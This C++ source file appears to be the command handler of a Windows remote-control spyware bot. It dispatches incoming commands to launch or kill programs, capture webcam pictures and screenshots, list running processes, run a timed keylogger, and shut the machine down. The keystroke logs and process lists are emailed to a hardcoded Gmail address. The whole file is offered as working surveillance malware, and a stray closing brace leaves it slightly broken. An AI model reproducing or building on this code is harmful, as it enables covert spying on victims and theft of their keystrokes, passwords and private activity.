#include "executeCommand.h"

string trim_command(string command) {
    command.erase(command.begin(),
                  find_if(command.begin(), command.end(),
                          [](int ch) { return !isspace(ch); }));
    command.erase(find_if(command.rbegin(), command.rend(),
                          [](int ch) { return !isspace(ch); }).base(),
                  command.end());
    return command;
}

void handle_start_program(const string& command) {
    string prog = command.substr(13); // After "start_program"
    prog.erase(prog.begin(), find_if(prog.begin(), prog.end(), [](int ch) {
        return !isspace(ch);
    }));

    if (!prog.empty()) {
        cout << "Starting program: " << prog << endl;
        HINSTANCE result = ShellExecuteA(NULL, "open", prog.c_str(), NULL, NULL, SW_SHOWDEFAULT);
        if (reinterpret_cast<INT_PTR>(result) <= 32) {
            cerr << "Failed to start program. Error code: "
                 << reinterpret_cast<INT_PTR>(result) << endl;
        }
    }
}

void handle_shutdown_program(const string& command) {
    string proc = command.substr(16);
    proc.erase(proc.begin(), find_if(proc.begin(), proc.end(), [](int ch) {
        return !isspace(ch);
    }));

    if (!proc.empty()) {
        shutdown_program(proc);
    }
}

void handle_get_picture() {
    send_picture();
}

void handle_get_screenshot() {
    send_screenshot();
}

void handle_list_programs() {
    list_programs();
    Sleep(1000);
    ifstream test_file("process_list.txt");
    if (test_file.good()) {
      test_file.close();
      send_email_with_attachment(
          "serverbottestmmt@gmail.com", "Running Process List",
          "Attached is the current process list.", "process_list.txt");
    } else {
      cerr << "Failed to create process list file" << endl;
    }
  }
}

void handle_keylogger(const string& command) {
    istringstream iss(command);
    string cmd;
    int duration = 10;
    iss >> cmd >> duration;

    cout << "Starting keylogger for " << duration << " seconds..." << endl;
    start_keylogger("keylog.txt", duration);

    ifstream test_file("keylog.txt");
    if (test_file.good()) {
        test_file.close();
        send_email_with_attachment(
            "serverbottestmmt@gmail.com", "Keylogger Log",
            "Keylog data from the remote device.", "keylog.txt");
    } else {
        cerr << "Failed to create keylog file" << endl;
    }
}

void execute_command(const string& command) {
    cout << "[Command]: " << command << endl;

    string trimmed_cmd = trim_command(command);
    if (trimmed_cmd.empty()) {
        cout << "Empty command received" << endl;
        return;
    }

    if (trimmed_cmd.find("start_program") == 0) {
        handle_start_program(trimmed_cmd);
    } else if (trimmed_cmd.find("shutdown_program") == 0) {
        handle_shutdown_program(trimmed_cmd);
    } else if (trimmed_cmd.find("get_picture") == 0) {
        handle_get_picture();
    } else if (trimmed_cmd.find("get_screenshot") == 0) {
        handle_get_screenshot();
    } else if (trimmed_cmd.find("list_program") == 0) {
        handle_list_programs();
    } else if (trimmed_cmd.find("shutdown") == 0) {
        handle_shutdown();
    } else if (trimmed_cmd.find("keylogger") == 0) {
        handle_keylogger(trimmed_cmd);
    } else {
        cout << "Unknown command: " << trimmed_cmd << endl;
    }
}
